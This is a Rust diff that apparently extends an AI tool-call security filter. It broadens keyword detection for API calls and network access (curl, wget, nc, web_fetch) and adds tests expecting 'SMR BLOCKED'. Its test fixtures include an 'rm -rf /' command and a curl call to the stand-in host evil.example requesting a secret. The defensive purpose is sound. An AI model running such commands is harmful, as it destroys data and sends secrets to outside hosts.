@@ -147,13 +147,30 @@ fn is_command_exec(text: &str) -> bool {
 }
 
 fn is_api_call(text: &str) -> bool {
-    text.contains("http://") || text.contains("https://") || text.contains("fetch(")
+    let lower = text.to_lowercase();
+    lower.contains("\"function\"")
+        || lower.contains("\"tool\"")
+        || lower.contains("\"name\":")
+        || lower.contains("invoke(")
+        || lower.contains("fetch(")
+        || lower.contains("grpc")
+        || lower.contains("rpc")
+        || lower.contains("sdk")
+        || lower.contains("runtime.")
+        || lower.contains("read_file")
+        || lower.contains("write(")
+        || ((text.contains("http://") || text.contains("https://"))
+            && !lower.contains("curl ")
+            && !lower.contains("wget "))
 }
 
 fn is_network_access(text: &str) -> bool {
     let lower = text.to_lowercase();
     lower.contains("curl ")
         || lower.contains("wget ")
+        || lower.contains("web_fetch")
+        || lower.contains("http.get")
+        || lower.contains("https.get")
         || lower.contains("nc ")
         || lower.contains("http://")
         || lower.contains("https://")
@@ -195,6 +212,54 @@ mod tests {
                 tool_index: 0,
             },
             text: r#"{"command":"rm -rf /"}"#.into(),
+        }];
+        let out = ops.process_response(&extracted).unwrap();
+        assert_eq!(out.len(), 1);
+        assert!(out[0].1.contains("SMR BLOCKED"));
+    }
+
+    #[test]
+    fn api_call_matches_tool_invocation_not_shell_curl() {
+        let rules = vec![OperationRule {
+            id: "block-read".into(),
+            enabled: true,
+            operation: OperationType::ApiCall,
+            object: OperationObject {
+                pattern: "read_file".into(),
+                is_regex: false,
+            },
+        }];
+        let ops = OperationSecurity::new(&rules, &[], OperationSecurityMode::Enforce).unwrap();
+        let extracted = vec![ExtractedText {
+            pointer: smr_protocol::TextPointer::OpenAiToolCallArguments {
+                message_index: 0,
+                tool_index: 0,
+            },
+            text: r#"{"name":"read_file","arguments":{"path":"/tmp/x"}}"#.into(),
+        }];
+        let out = ops.process_response(&extracted).unwrap();
+        assert_eq!(out.len(), 1);
+        assert!(out[0].1.contains("SMR BLOCKED"));
+    }
+
+    #[test]
+    fn network_access_matches_curl_not_tool_api() {
+        let rules = vec![OperationRule {
+            id: "block-curl".into(),
+            enabled: true,
+            operation: OperationType::NetworkAccess,
+            object: OperationObject {
+                pattern: "https://evil.example".into(),
+                is_regex: false,
+            },
+        }];
+        let ops = OperationSecurity::new(&rules, &[], OperationSecurityMode::Enforce).unwrap();
+        let extracted = vec![ExtractedText {
+            pointer: smr_protocol::TextPointer::OpenAiToolCallArguments {
+                message_index: 0,
+                tool_index: 0,
+            },
+            text: r#"{"command":"curl https://evil.example/secret"}"#.into(),
         }];
         let out = ops.process_response(&extracted).unwrap();
         assert_eq!(out.len(), 1);
